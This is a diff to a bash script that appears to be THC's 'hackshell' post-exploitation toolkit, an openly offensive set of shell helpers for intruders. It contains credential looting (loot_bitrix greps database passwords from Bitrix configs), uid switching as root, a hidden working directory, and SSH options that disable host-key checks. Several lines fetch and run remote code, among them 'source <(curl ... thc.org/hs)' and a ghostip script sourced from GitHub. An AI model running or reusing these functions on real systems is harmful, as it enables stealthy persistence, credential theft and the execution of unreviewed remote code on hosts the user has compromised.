@@ -89,15 +89,19 @@ xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
 xsu() {
     local name="${1:?}"
     local u g h
+    local bak
 
     [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return; }
     u=$(id -u "${name:?}") || return
     g=$(id -g "${name:?}") || return
     h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)"
     echo "HOME=${h:-/tmp}"
-    unset -n _HS_HOME_ORIG
+    # Not all systems support unset -n
+    # unset -n _HS_HOME_ORIG
+    bak="$_HS_HOME_ORIG"
+    unset _HS_HOME_ORIG
     HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
-    export _HS_HOME_ORIG
+    export _HS_HOME_ORIG="$bak"
 }
 
 xtmux() {
@@ -110,7 +114,6 @@ xtmux() {
 xssh() {
     local ttyp="$(stty -g)"
     local opts=()
-    echo -e "May need to cut & paste:  ${CDC}source <(curl -SsfL https://thc.org/hs)${CN}"
     [ -z "$NOMX" ] && {
         [ ! -d "$XHOME" ] && hs_mkxhome
         [ -d "$XHOME" ] && {
@@ -118,6 +121,7 @@ xssh() {
             opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
         }
     }
+    echo -e "May need to cut & paste:  ${CDC}source <(curl -SsfL https://thc.org/hs)${CN}"
     stty raw -echo icrnl opost
     \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
         "$@" \
@@ -373,9 +377,15 @@ crt() {
     curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
 }
 
-rdns () {
-    curl -fsSL "https://lookup.segfault.net/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
+ptr() {
+    local str
+    [ -n "$DNSDBTOKEN" ] && curl -m10 -H "X-API-Key: ${DNSDBTOKEN}" -H "Accept: application/json" -SsfL "https://api.dnsdb.info/lookup/rdata/ip/${1:?}/?limit=5&time_last_after=$(( $(date +%s) - 60 * 60 * 24 * 30))"
+    curl -m10 -SsfL "https://ip.thc.org/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
+    curl -m10 -SsfL -H "Authorization: Bearer ${IOTOKEN}" "https://ipinfo.io/${1:?}" && echo
+    str="$(host "$1" 2>/dev/null)" && echo "${str##* }"
 }
+
+rdns() { ptr "$@"; }
 
 ghostip() {
     source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
@@ -416,7 +426,6 @@ hide() {
 
 _hs_xhome_init() {
     [[ "$PATH" != *"$XHOME"* ]] && export PATH="${XHOME}:$PATH"
-    hs_init_alias_reinit
 }
 
 hs_mkxhome() {
@@ -429,7 +438,11 @@ hs_mkxhome() {
     echo -e ">>> Type ${CDC}xcd${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
 }
 
-cdx() { cd "${XHOME}" || return; }
+cdx() {
+    hs_mkxhome
+    cd "${XHOME}" || return
+}
+
 xcd() { cdx; }
 
 # Keep this seperate because this actually creates data.
@@ -449,6 +462,7 @@ xkeep() {
     touch "${XHOME}/.keep" 2>/dev/null
     HS_INFO "Wont delete ${CDY}${XHOME}${CDM} on exit"
 }
+
 
 tit() {
     local str
@@ -529,7 +543,10 @@ dbin() {
 
     cdir="${XHOME}/.dbin"
     [ ! -d "${cdir}" ] && { mkdir "${cdir}" || return; }
-    DBIN_CACHEDIR="${cdir}" DBIN_TRACKERFILE="${cdir}/tracker.json" DBIN_INSTALL_DIR="${XHOME}" "${XHOME}/dbin" "$@"
+    # Show dbin's help or download. 
+    DBIN_CACHEDIR="${cdir}" DBIN_TRACKERFILE="${cdir}/tracker.json" DBIN_INSTALL_DIR="${XHOME}" "${XHOME}/dbin" "$@" && {
+        hs_init_alias_reinit
+    }
     [ $# -eq 0 ] && { HS_INFO "Example: ${CDC}dbin install nmap"; }
 }
 
@@ -636,6 +653,7 @@ bin() {
         echo -e ">>> ${CDG}Download COMPLETE${CN}"
     }
 
+    hs_init_alias_reinit
     unset -f bin_dl
 }
 
@@ -660,7 +678,7 @@ loot_bitrix() {
     [ ! -f "$fn" ] && return
     grep -Fqam1 '$_ENV[' "$fn" && return
     echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
-    grep --color=never -E "(host|database|login|password)'.*=" "${fn}"
+    grep --color=never -E "(host|database|login|password)'.*=" "${fn}" | sed 's/\s*//g'
     echo -en "${CN}"
 }
 
@@ -1133,7 +1151,7 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
         # HS_SSH_OPT+=("-oUpdateHostKeys=no")
         HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
         HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
-        HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
+        [[ "$(\ssh -Q key)" == *"ssh-dss"* ]] && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
     }
